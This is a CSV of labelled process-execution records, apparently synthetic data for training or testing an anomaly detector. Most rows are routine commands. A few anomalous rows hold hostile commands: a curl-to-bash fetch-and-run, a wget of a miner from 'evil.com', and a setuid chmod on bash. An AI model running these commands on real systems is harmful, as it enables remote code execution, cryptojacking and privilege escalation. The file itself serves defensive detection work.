parent_comm,executed_cmd,is_anomaly
dockerd,usr/bin/docker ps,0
nginx,/usr/sbin/nginx -g daemon off;,0
dockerd,usr/bin/docker ps,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
nginx,/usr/sbin/nginx -g daemon off;,0
dockerd,usr/bin/docker ps,0
sh,/bin/sh -c date,0
bash,/usr/bin/cat /etc/hosts,0
nginx,/usr/sbin/nginx -g daemon off;,0
dockerd,usr/bin/docker ps,0
bash,/usr/bin/cat /etc/hosts,0
bash,/usr/bin/ls -la /var/log,0
python3,/usr/bin/python3 app.py,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
systemd,/usr/lib/systemd/systemd-journald,0
sh,/bin/sh -c date,0
dockerd,usr/bin/docker ps,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
systemd,/usr/lib/systemd/systemd-journald,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
nginx,/usr/sbin/nginx -g daemon off;,0
bash,/usr/bin/ls -la /var/log,0
nginx,/usr/sbin/nginx -g daemon off;,0
systemd,/usr/lib/systemd/systemd-journald,0
bash,/usr/bin/cat /etc/hosts,0
bash,/usr/bin/cat /etc/hosts,0
dockerd,usr/bin/docker ps,0
python3,/usr/bin/python3 app.py,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
sh,/bin/sh -c date,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
nginx,/usr/sbin/nginx -g daemon off;,0
systemd,/usr/lib/systemd/systemd-journald,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
bash,/usr/bin/ls -la /var/log,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
bash,/usr/bin/cat /etc/hosts,0
sh,/bin/sh -c date,0
bash,/usr/bin/cat /etc/hosts,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
nginx,/usr/sbin/nginx -g daemon off;,0
python3,/usr/bin/python3 app.py,0
bash,/usr/bin/cat /etc/hosts,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
systemd,/usr/lib/systemd/systemd-journald,0
nginx,/usr/sbin/nginx -g daemon off;,0
systemd,/usr/lib/systemd/systemd-journald,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
bash,/usr/bin/ls -la /var/log,0
sh,/bin/sh -c date,0
systemd,/usr/lib/systemd/systemd-journald,0
python3,/usr/bin/python3 app.py,0
dockerd,usr/bin/docker ps,0
bash,/usr/bin/ls -la /var/log,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
bash,/usr/bin/cat /etc/hosts,0
sh,/bin/sh -c date,0
bash,/usr/bin/ls -la /var/log,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
systemd,/usr/lib/systemd/systemd-journald,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
sh,/bin/sh -c date,0
python3,/usr/bin/python3 app.py,0
sh,/bin/sh -c date,0
bash,/usr/bin/ls -la /var/log,0
bash,/usr/bin/cat /etc/hosts,0
nginx,/usr/sbin/nginx -g daemon off;,0
bash,/usr/bin/ls -la /var/log,0
nginx,/usr/sbin/nginx -g daemon off;,0
sh,/bin/sh -c date,0
bash,/usr/bin/curl -s http://192.168.1.100/payload | bash,1
nginx,/usr/sbin/nginx -g daemon off;,0
dockerd,usr/bin/docker ps,0
systemd,/usr/lib/systemd/systemd-journald,0
bash,/usr/bin/cat /etc/hosts,0
sh,/bin/sh -c date,0
python3,/usr/bin/python3 app.py,0
dockerd,usr/bin/docker ps,0
dockerd,usr/bin/docker ps,0
sh,/bin/sh -c date,0
bash,/usr/bin/cat /etc/hosts,0
dockerd,usr/bin/docker ps,0
bash,/usr/bin/cat /etc/hosts,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
dockerd,usr/bin/docker ps,0
nginx,/usr/sbin/nginx -g daemon off;,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
systemd,/usr/lib/systemd/systemd-journald,0
sh,/bin/sh -c date,0
sh,/bin/sh -c date,0
python3,/usr/bin/python3 app.py,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
bash,/usr/bin/ls -la /var/log,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
nginx,/usr/sbin/nginx -g daemon off;,0
systemd,/usr/lib/systemd/systemd-journald,0
python3,/usr/bin/python3 app.py,0
nginx,/usr/sbin/nginx -g daemon off;,0
nginx,/usr/sbin/nginx -g daemon off;,0
sh,/bin/sh -c date,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
nginx,/usr/sbin/nginx -g daemon off;,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
systemd,/usr/lib/systemd/systemd-journald,0
bash,/usr/bin/ls -la /var/log,0
bash,/usr/bin/ls -la /var/log,0
systemd,/usr/lib/systemd/systemd-journald,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
bash,/usr/bin/cat /etc/hosts,0
systemd,/usr/lib/systemd/systemd-journald,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
nginx,/usr/sbin/nginx -g daemon off;,0
dockerd,usr/bin/docker ps,0
bash,/usr/bin/cat /etc/hosts,0
systemd,/usr/lib/systemd/systemd-journald,0
systemd,/usr/lib/systemd/systemd-journald,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
systemd,/usr/lib/systemd/systemd-journald,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
dockerd,usr/bin/docker ps,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
bash,/usr/bin/cat /etc/hosts,0
python3,/usr/bin/python3 app.py,0
nginx,/usr/sbin/nginx -g daemon off;,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
dockerd,usr/bin/docker ps,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
systemd,/usr/lib/systemd/systemd-journald,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
bash,/usr/bin/cat /etc/hosts,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
python3,/usr/bin/python3 app.py,0
dockerd,usr/bin/docker ps,0
dockerd,usr/bin/docker ps,0
systemd,/usr/lib/systemd/systemd-journald,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
systemd,/usr/lib/systemd/systemd-journald,0
systemd,/usr/lib/systemd/systemd-journald,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
bash,/usr/bin/cat /etc/hosts,0
systemd,/usr/lib/systemd/systemd-journald,0
systemd,/usr/lib/systemd/systemd-journald,0
bash,/usr/bin/ls -la /var/log,0
systemd,/usr/lib/systemd/systemd-journald,0
sh,/bin/sh -c date,0
python3,/usr/bin/python3 app.py,0
bash,/usr/bin/ls -la /var/log,0
python3,/usr/bin/python3 app.py,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
bash,/usr/bin/ls -la /var/log,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
systemd,/usr/lib/systemd/systemd-journald,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
bash,/usr/bin/ls -la /var/log,0
bash,/usr/bin/ls -la /var/log,0
python3,/usr/bin/python3 app.py,0
nginx,/usr/sbin/nginx -g daemon off;,0
systemd,/usr/lib/systemd/systemd-journald,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
nginx,/usr/sbin/nginx -g daemon off;,0
dockerd,usr/bin/docker ps,0
bash,/usr/bin/ls -la /var/log,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
bash,/usr/bin/curl -s http://192.168.1.100/payload | bash,1
systemd,/usr/lib/systemd/systemd-journald,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
python3,/usr/bin/python3 app.py,0
bash,/usr/bin/cat /etc/hosts,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
systemd,/usr/lib/systemd/systemd-journald,0
dockerd,usr/bin/docker ps,0
dockerd,usr/bin/docker ps,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
systemd,/usr/lib/systemd/systemd-journald,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
nginx,/usr/sbin/nginx -g daemon off;,0
sh,/bin/sh -c date,0
bash,/usr/bin/cat /etc/hosts,0
bash,/usr/bin/ls -la /var/log,0
systemd,/usr/lib/systemd/systemd-journald,0
python3,/usr/bin/python3 app.py,0
bash,/usr/bin/cat /etc/hosts,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
sh,/bin/sh -c date,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
nginx,/usr/sbin/nginx -g daemon off;,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
sh,/bin/sh -c date,0
nginx,/usr/sbin/nginx -g daemon off;,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
bash,/usr/bin/ls -la /var/log,0
systemd,/usr/lib/systemd/systemd-journald,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
sh,/bin/sh -c date,0
bash,/usr/bin/ls -la /var/log,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
python3,/usr/bin/python3 app.py,0
bash,/usr/bin/cat /etc/hosts,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
bash,/usr/bin/cat /etc/hosts,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
dockerd,usr/bin/docker ps,0
bash,/usr/bin/cat /etc/hosts,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
sh,/bin/sh -c date,0
dockerd,usr/bin/docker ps,0
systemd,/usr/lib/systemd/systemd-journald,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
python3,/usr/bin/python3 app.py,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
dockerd,usr/bin/docker ps,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
bash,/usr/bin/ls -la /var/log,0
sh,/bin/sh -c date,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
nginx,/usr/sbin/nginx -g daemon off;,0
systemd,/usr/lib/systemd/systemd-journald,0
bash,/usr/bin/ls -la /var/log,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
bash,/usr/bin/ls -la /var/log,0
bash,/usr/bin/ls -la /var/log,0
sh,/bin/sh -c date,0
sh,/bin/sh -c date,0
python3,/usr/bin/python3 app.py,0
bash,/usr/bin/cat /etc/hosts,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
sh,/bin/sh -c date,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
systemd,/usr/lib/systemd/systemd-journald,0
python3,/usr/bin/python3 app.py,0
nginx,/usr/sbin/nginx -g daemon off;,0
bash,/usr/bin/ls -la /var/log,0
bash,/usr/bin/cat /etc/hosts,0
nginx,/usr/sbin/nginx -g daemon off;,0
nginx,/usr/sbin/nginx -g daemon off;,0
systemd,/usr/lib/systemd/systemd-journald,0
systemd,/usr/lib/systemd/systemd-journald,0
sh,/bin/sh -c date,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
bash,/usr/bin/wget http://evil.com/miner.sh -O /tmp/miner.sh,1
nginx,/usr/sbin/nginx -g daemon off;,0
systemd,/usr/lib/systemd/systemd-journald,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
nginx,/usr/sbin/nginx -g daemon off;,0
bash,/usr/bin/ls -la /var/log,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
python3,/usr/bin/python3 app.py,0
dockerd,usr/bin/docker ps,0
sh,/bin/sh -c date,0
bash,/usr/bin/cat /etc/hosts,0
dockerd,usr/bin/docker ps,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
bash,/usr/bin/cat /etc/hosts,0
sh,/bin/sh -c date,0
bash,/usr/bin/cat /etc/hosts,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
bash,/usr/bin/cat /etc/hosts,0
sh,/bin/sh -c date,0
sh,/bin/sh -c date,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
nginx,/usr/sbin/nginx -g daemon off;,0
bash,/usr/bin/ls -la /var/log,0
nginx,/usr/sbin/nginx -g daemon off;,0
sh,/bin/sh -c date,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
sh,/bin/sh -c date,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
bash,/usr/bin/ls -la /var/log,0
systemd,/usr/lib/systemd/systemd-journald,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
dockerd,usr/bin/docker ps,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
dockerd,usr/bin/docker ps,0
dockerd,usr/bin/docker ps,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
sh,/bin/sh -c date,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
dockerd,usr/bin/docker ps,0
bash,/usr/bin/ls -la /var/log,0
dockerd,usr/bin/docker ps,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
python3,/usr/bin/python3 app.py,0
python3,/usr/bin/python3 app.py,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
dockerd,usr/bin/docker ps,0
nginx,/usr/sbin/nginx -g daemon off;,0
bash,/usr/bin/cat /etc/hosts,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
systemd,/usr/lib/systemd/systemd-journald,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
systemd,/usr/lib/systemd/systemd-journald,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
sh,/bin/sh -c date,0
python3,/usr/bin/python3 app.py,0
python3,/usr/bin/python3 app.py,0
nginx,/usr/sbin/nginx -g daemon off;,0
bash,/usr/bin/cat /etc/hosts,0
systemd,/usr/lib/systemd/systemd-journald,0
bash,/usr/bin/ls -la /var/log,0
bash,/usr/bin/cat /etc/hosts,0
python3,/usr/bin/python3 app.py,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
nginx,/usr/sbin/nginx -g daemon off;,0
bash,/usr/bin/ls -la /var/log,0
systemd,/usr/lib/systemd/systemd-journald,0
bash,/usr/bin/ls -la /var/log,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
nginx,/usr/sbin/nginx -g daemon off;,0
dockerd,usr/bin/docker ps,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
nginx,/usr/sbin/nginx -g daemon off;,0
systemd,/usr/lib/systemd/systemd-journald,0
nginx,/usr/sbin/nginx -g daemon off;,0
dockerd,usr/bin/docker ps,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
bash,/usr/bin/ls -la /var/log,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
nginx,/usr/sbin/nginx -g daemon off;,0
sh,/bin/sh -c date,0
nginx,/usr/sbin/nginx -g daemon off;,0
dockerd,usr/bin/docker ps,0
python3,/usr/bin/python3 app.py,0
sh,/bin/sh -c date,0
python3,/usr/bin/python3 app.py,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
sh,/bin/sh -c date,0
bash,/usr/bin/cat /etc/hosts,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
sh,/bin/sh -c date,0
nginx,/usr/sbin/nginx -g daemon off;,0
bash,/usr/bin/ls -la /var/log,0
systemd,/usr/lib/systemd/systemd-journald,0
systemd,/usr/lib/systemd/systemd-journald,0
nginx,/usr/sbin/nginx -g daemon off;,0
bash,/usr/bin/ls -la /var/log,0
sh,/bin/sh -c date,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
python3,/usr/bin/python3 app.py,0
sh,/bin/sh -c date,0
nginx,/usr/sbin/nginx -g daemon off;,0
bash,/usr/bin/ls -la /var/log,0
bash,/usr/bin/cat /etc/hosts,0
nginx,/usr/sbin/nginx -g daemon off;,0
sh,/bin/sh -c date,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
python3,/usr/bin/python3 app.py,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
systemd,/usr/lib/systemd/systemd-journald,0
systemd,/usr/lib/systemd/systemd-journald,0
sh,/bin/sh -c date,0
systemd,/usr/lib/systemd/systemd-journald,0
sh,chmod +s /bin/bash,1
nginx,/usr/sbin/nginx -g daemon off;,0
systemd,/usr/lib/systemd/systemd-journald,0
python3,/usr/bin/python3 app.py,0
python3,/usr/bin/python3 app.py,0
sh,/bin/sh -c date,0
bash,/usr/bin/cat /etc/hosts,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
bash,/usr/bin/cat /etc/hosts,0
bash,/usr/bin/ls -la /var/log,0
nginx,/usr/sbin/nginx -g daemon off;,0
bash,/usr/bin/ls -la /var/log,0
nginx,/usr/sbin/nginx -g daemon off;,0
nginx,/usr/sbin/nginx -g daemon off;,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
bash,/usr/bin/ls -la /var/log,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
systemd,/usr/lib/systemd/systemd-journald,0
dockerd,usr/bin/docker ps,0
bash,/usr/bin/cat /etc/hosts,0
bash,/usr/bin/ls -la /var/log,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
bash,/usr/bin/cat /etc/hosts,0
bash,/usr/bin/ls -la /var/log,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
bash,/usr/bin/cat /etc/hosts,0
python3,/usr/bin/python3 app.py,0
systemd,/usr/lib/systemd/systemd-journald,0
dockerd,usr/bin/docker ps,0
bash,/usr/bin/cat /etc/hosts,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
sh,/bin/sh -c date,0
systemd,/usr/lib/systemd/systemd-journald,0
sh,/bin/sh -c date,0
bash,/usr/bin/cat /etc/hosts,0
dockerd,usr/bin/docker ps,0
nginx,/usr/sbin/nginx -g daemon off;,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
python3,/usr/bin/python3 app.py,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
systemd,/usr/lib/systemd/systemd-journald,0
nginx,/usr/sbin/nginx -g daemon off;,0
sh,/bin/sh -c date,0
bash,/usr/bin/ls -la /var/log,0
dockerd,usr/bin/docker ps,0
systemd,/usr/lib/systemd/systemd-journald,0
sh,/bin/sh -c date,0
systemd,/usr/lib/systemd/systemd-journald,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
bash,/usr/bin/cat /etc/hosts,0
nginx,/usr/sbin/nginx -g daemon off;,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
sh,/bin/sh -c date,0
systemd,/usr/lib/systemd/systemd-journald,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
nginx,/usr/sbin/nginx -g daemon off;,0
nginx,/usr/sbin/nginx -g daemon off;,0
bash,/usr/bin/ls -la /var/log,0
systemd,/usr/lib/systemd/systemd-journald,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
bash,/usr/bin/ls -la /var/log,0
systemd,/usr/lib/systemd/systemd-journald,0
dockerd,usr/bin/docker ps,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
python3,/usr/bin/python3 app.py,0
python3,/usr/bin/python3 app.py,0
bash,/usr/bin/cat /etc/hosts,0
python3,/usr/bin/python3 app.py,0
bash,/usr/bin/ls -la /var/log,0
sh,/bin/sh -c date,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
dockerd,usr/bin/docker ps,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
dockerd,usr/bin/docker ps,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
nginx,/usr/sbin/nginx -g daemon off;,0
python3,/usr/bin/python3 app.py,0
python3,/usr/bin/python3 app.py,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
bash,/usr/bin/ls -la /var/log,0
bash,/usr/bin/cat /etc/hosts,0
bash,/usr/bin/ls -la /var/log,0
sh,/bin/sh -c date,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
bash,/usr/bin/cat /etc/hosts,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
bash,/usr/bin/cat /etc/hosts,0
systemd,/usr/lib/systemd/systemd-journald,0
nginx,/usr/sbin/nginx -g daemon off;,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
dockerd,usr/bin/docker ps,0
bash,/usr/bin/ls -la /var/log,0
nginx,/usr/sbin/nginx -g daemon off;,0
dockerd,usr/bin/docker ps,0
sh,/bin/sh -c date,0
python3,/usr/bin/python3 app.py,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
nginx,/usr/sbin/nginx -g daemon off;,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
python3,/usr/bin/python3 app.py,0
sh,/bin/sh -c date,0
bash,/usr/bin/cat /etc/hosts,0
bash,/usr/bin/cat /etc/hosts,0
dockerd,usr/bin/docker ps,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
dockerd,usr/bin/docker ps,0
python3,/usr/bin/python3 app.py,0
dockerd,usr/bin/docker ps,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
bash,/usr/bin/ls -la /var/log,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
dockerd,usr/bin/docker ps,0
nginx,/usr/sbin/nginx -g daemon off;,0
dockerd,usr/bin/docker ps,0
bash,/usr/bin/cat /etc/hosts,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
nginx,/usr/sbin/nginx -g daemon off;,0
systemd,/usr/lib/systemd/systemd-journald,0
python3,/usr/bin/python3 app.py,0
python3,/usr/bin/python3 app.py,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
python3,/usr/bin/python3 app.py,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
sh,/bin/sh -c date,0
sh,/bin/sh -c date,0
nginx,/usr/sbin/nginx -g daemon off;,0
python3,/usr/bin/python3 app.py,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
systemd,/usr/lib/systemd/systemd-journald,0
nginx,/usr/sbin/nginx -g daemon off;,0
dockerd,usr/bin/docker ps,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
sh,/bin/sh -c date,0
sh,/bin/sh -c date,0
dockerd,usr/bin/docker ps,0
bash,/usr/bin/curl -s http://192.168.1.100/payload | bash,1
nginx,/usr/sbin/nginx -g daemon off;,0
systemd,/usr/lib/systemd/systemd-journald,0
bash,/usr/bin/cat /etc/hosts,0
bash,/usr/bin/cat /etc/hosts,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
dockerd,usr/bin/docker ps,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
